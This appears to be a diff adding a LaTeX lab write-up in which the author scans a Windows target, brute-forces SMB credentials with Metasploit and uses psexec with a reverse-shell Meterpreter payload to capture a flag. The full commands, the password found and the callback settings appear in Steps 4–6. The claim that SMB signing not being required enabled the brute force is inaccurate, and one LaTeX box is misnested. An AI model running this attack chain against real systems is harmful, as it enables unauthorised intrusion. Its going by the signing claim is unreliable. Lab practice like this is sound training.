@@ -1,0 +1,182 @@
+\chapter{Lab: SMB Server PSexec}
+\label{lab:smb_psexec}
+
+\begin{notebox}[Lab objective]
+Fingerprint the SMB service on a Windows target, brute-force valid credentials
+using Metasploit's \ic{smb\_login} scanner, then use the administrator account
+with the PSexec exploit to gain a Meterpreter session and retrieve the flag.
+\end{notebox}
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section*{Environment}
+\begin{itemize}
+  \item \textbf{Attacker:} Kali Linux (INE lab environment)
+  \item \textbf{Target:} \ic{demo.ine.local} --- \ic{10.2.28.213}
+  \item \textbf{Tools:} \ic{ping}, \ic{nmap}, Metasploit (\ic{smb\_login} +
+        \ic{psexec})
+  \item \textbf{Wordlists:} Metasploit built-in (\ic{common\_users.txt} +
+        \ic{unix\_passwords.txt})
+\end{itemize}
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section*{Step 1 --- Confirm the Host is Up}
+
+\begin{termbox}
+ping -c 1 demo.ine.local
+\end{termbox}
+
+Host responded. TTL of 125 is a Windows fingerprint --- Linux would typically be
+64. Got the IP \ic{10.2.28.213} confirmed.
+
+\screenshot{assets/images/Screenshot_2026-04-13_at_10.20.04_PM.png}{Ping confirming demo.ine.local is alive at 10.2.28.213}
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section*{Step 2 --- Port Scan with Service and Version Detection}
+
+\begin{termbox}
+nmap -sV -sC 10.2.28.213
+\end{termbox}
+
+\textbf{Key findings:}
+\begin{itemize}
+  \item \textbf{Port 445 open} --- SMB2 running
+  \item \textbf{SMB signing: enabled but not required} --- relay attacks viable
+  \item \textbf{Product Version: 10.0.14393} --- Windows Server 2016
+  \item \textbf{Port 3389 open} --- RDP (useful for later pivoting if needed)
+  \item Computer name: \ic{EC2AMAZ-408S766}
+\end{itemize}
+
+\begin{whybox}[Why message signing matters]
+SMB message signing not being required is a misconfiguration. It means an
+attacker can relay authentication attempts without the server rejecting them.
+This is the condition that makes brute-force and credential relay attacks viable.
+\end{whybox}
+
+\screenshot{assets/images/Screenshot_2026-04-13_at_10.22.00_PM.png}{nmap results showing SMB2 on port 445 with signing not required}
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section*{Step 3 --- Start Metasploit and Create Workspace}
+
+
+
+\begin{termbox}
+service postgresql start && msfconsole
+workspace -a windows_smb_server_PSexec
+\end{termbox}
+
+\begin{whybox}[Why message signing matters]
+
+Created a dedicated workspace so these results stay isolated from other labs.
+
+\screenshot{assets/images/Screenshot_2026-04-13_at_10.25.20_PM.png}{Metasploit started with new workspace created}
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section*{Step 4 --- Brute-Force SMB Credentials}
+
+\begin{termbox}
+search smb_login
+use auxiliary/scanner/smb/smb_login
+set RHOST 10.2.28.213
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+set VERBOSE false
+run
+\end{termbox}
+
+I set \ic{VERBOSE false} because I don't want to sit through thousands of failed
+lines. I only care about the successes.
+
+\screenshot{assets/images/Screenshot_2026-04-13_at_10.27.51_PM.png}{smb\_login configuration with wordlists and VERBOSE false}
+
+\screenshot{assets/images/Screenshot_2026-04-13_at_10.41.50_PM.png}{smb\_login results showing 4 valid credential pairs found}
+
+\textbf{Credentials found:}
+\begin{itemize}
+  \item \ic{sysadmin:samantha}
+  \item \ic{demo:victoria}
+  \item \ic{auditor:elizabeth}
+  \item \textbf{\ic{administrator:qwertyuiop}} $\leftarrow$ this is the one
+\end{itemize}
+
+Four credential pairs found. The administrator account has full system privileges
+so that is the one going straight into PsExec.
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section*{Step 5 --- Exploit with PsExec}
+
+\begin{termbox}
+search psexec
+use exploit/windows/smb/psexec
+# No payload configured --- defaults to windows/meterpreter/reverse_tcp
+
+set RHOST 10.2.28.213
+set SMBUser Administrator
+set SMBPass qwertyuiop
+set LHOST 10.10.37.4    # My Kali VPN interface --- must be VPN, not loopback
+exploit
+\end{termbox}
+
+\begin{whybox}[Why VPN interface for LHOST]
+LHOST must be the VPN interface (the \ic{10.10.x.x} address in INE labs).
+The target machine needs to be able to reach back to the attacker. If LHOST
+is set to \ic{127.0.0.1} or the wrong interface, the reverse shell has nowhere
+to connect and the session never opens.
+\end{whybox}
+
+\screenshot{assets/images/Screenshot_2026-04-13_at_10.43.56_PM.png}{PsExec exploit configured with administrator credentials}
+
+\screenshot{assets/images/Screenshot_2026-04-13_at_10.51.06_PM.png}{Meterpreter session 1 opened as Administrator}
+
+\textbf{What happened:}
+\begin{enumerate}
+  \item Reverse TCP handler started on my listener port
+  \item Module connected to SMB on port 445
+  \item Authenticated as Administrator with the found credentials
+  \item Metasploit selected PowerShell as the execution target (modern Windows)
+  \item Payload executed --- ``service start timed out'' is normal (standalone
+        process, not a registered service)
+  \item \textbf{Meterpreter session 1 opened}
+\end{enumerate}
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section*{Step 6 --- Post-Exploitation and Flag}
+
+\begin{termbox}
+meterpreter > cd /
+meterpreter > ls
+# flag.txt visible in C:\
+meterpreter > cat flag.txt
+\end{termbox}
+
+\ic{flag.txt} was sitting right at the root of \ic{C:\textbackslash}. One
+command and the lab was done.
+
+\screenshot{assets/images/Screenshot_2026-04-13_at_10.53.37_PM.png}{ls showing flag.txt at C:\ root}
+
+\screenshot{assets/images/Screenshot_2026-04-13_at_10.53.37_PM.png}{cat flag.txt --- flag captured and lab complete}
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section*{Result}
+
+Flag retrieved. 1 of 1 flags captured. Lab complete.
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section*{Key Learning}
+
+\begin{takebox}
+\begin{itemize}
+  \item The TTL from the ping (125) already hinted Windows before nmap ran.
+        Small passive signals matter.
+  \item \ic{nmap -sC} running the SMB NSE scripts automatically pulled the OS
+        version, signing status, computer name, and domain. No separate
+        enumeration tool needed.
+  \item SMB signing not being required was the technical condition that made this
+        entire attack chain possible. One config setting.
+  \item \ic{VERBOSE false} during brute-force is a habit --- it turns thousands
+        of lines into just the four that mattered.
+  \item Everything fed forward: IP from ping $\rightarrow$ nmap $\rightarrow$
+        smb\_login $\rightarrow$ psexec. Each step built directly on the last.
+\end{itemize}
+\end{takebox}
+
+\end{whybox}
